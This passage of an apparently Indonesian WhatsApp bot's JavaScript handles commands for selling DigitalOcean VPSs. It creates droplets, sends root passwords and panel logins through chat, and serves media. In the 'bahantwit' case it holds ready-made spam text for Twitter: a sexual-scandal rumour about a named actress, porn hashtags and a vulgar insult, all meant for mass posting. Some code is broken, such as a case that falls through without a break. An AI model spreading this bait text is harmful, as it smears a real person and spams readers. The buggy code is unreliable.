      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return (`Ngapain? Khusus Owner!!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》Hardz Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m4}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Ip : ${m2}*\n*[+] Username : root*\n*[+] Password : ${m5}*\n*[+] Ram : ${m3}*\n\n*───《TOS VPS》───*\n\n*-JANGAN SAMPAI TERKENA DDOS*\n*-JANGAN GUNAKAN UNTUK DDOS*\n*-JANGAN GUNAKAN UNTUK MINING*\n*-CPU JANGAN SAMPAI 100%*\n*-JANGAN DIPAKAI UNTUK TUNELING*\n*-MELANGGAR RULES? GARANSI ANGUS*\n*-PANEL SUS NO REFF*\n\n\n\n*© Hardz Offcial*`}, m) 
}
break
 case 'sdomain': case 'sendomain': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》Hardz Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Domain : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Tutup ( Sensor ) Domain Anda Dan Jangan Sampai Orang Lain Melihat Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*\n\n\n\n*© Hardz Offcial*`}, m) 
                 }
            break
 case 'spanel': case 'sendpanel': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
		 if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
          if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,linklog,username, password`)
            m.reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya =  + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
Biiofc.sendMessage(mq1, {text:`*───❖》Hardz Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : ${m4}*\n*[+] Password : ${m5}*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n\n\n\n*© Hardz Offcial*`}, m) 
                 }
            break
case 'bahanyt':
        id = m.key.remoteJid
        if(validGrup(id,grups)){
                bahanyt =`
https://drive.google.com/drive/mobile/folders/1wla7p1yce-F0nxJdCX2aUq_OAozTYZeK
_*BAHAN NEBAR YOUTUBE TU DECK*_`
                reply(bahanyt)


        }else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
    break
case 'bahantwit':
id = m.key.remoteJid
        if(validGrup(id,grups)){
 bahantwit =`
*AWOKAWOK GABISA NEBAR DEK? NIH BAHAN NYA KONTOL!!!*

 _BAHAN NEBAR TWITTER_
_*©LIF4YOU X DIMAS*_
 
 HT TWITTER 

Yg lagi viral Biadab Artis Anissa Aziza
Terekam cctv  di mall selingkuh 

Scandal viral  terbaru VCS
malam sabtu bokep indo terbaru
#JanganLupaNgeDOT
#SANGE_AAAAAAAAAAH
#SANGE_AAAAAAAAAA`
reply(bahantwit)

        }else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }

break
case 'addgcweb':
            if (!isOwner && !m.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
                id = msg.key.remoteJid
                pengirim = m.key.participant
                nama = m.chat.pushName
reply('_*SUKSES BANG GRUP MU UDH BISA DI AKSES*_')          
case 'update':
        if (!isOwner && !m.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `ketik .update
            `
            reply(psn)
            }else{                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `*SUKSES OM*`
reply(info)
}                
}            
break
case 'getcase':

const getCase = (cases) => {

            return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }

        break
 case 'autoread':
                if (!isOwner) return reply(mess.owner)
                if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    reply(`Berhasil mengubah autoread ke ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    reply(`Berhasil mengubah autoread ke ${q}`)
                }
                break      
  case 'myip':
            case 'ipbot':
                if (!isOwner) return reply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
                break
  case 'randomcecan1':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar Tuan Sedang Kami Proses⏳_`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_27832zh400.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://g.top4top.io/m_2783uxoa40.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
if (!isOwner) return reply(`Ngapain ? Khusus Hardz Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
break
 case 'tiktokaudio':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'r': case 'revoke': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isBotAdmins) return reply(mess.only.badmin)
Biiofc.groupRevokeInvite(m.chat)
}
break
case 'tiktokgirl':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
Biiofc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
XeonStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
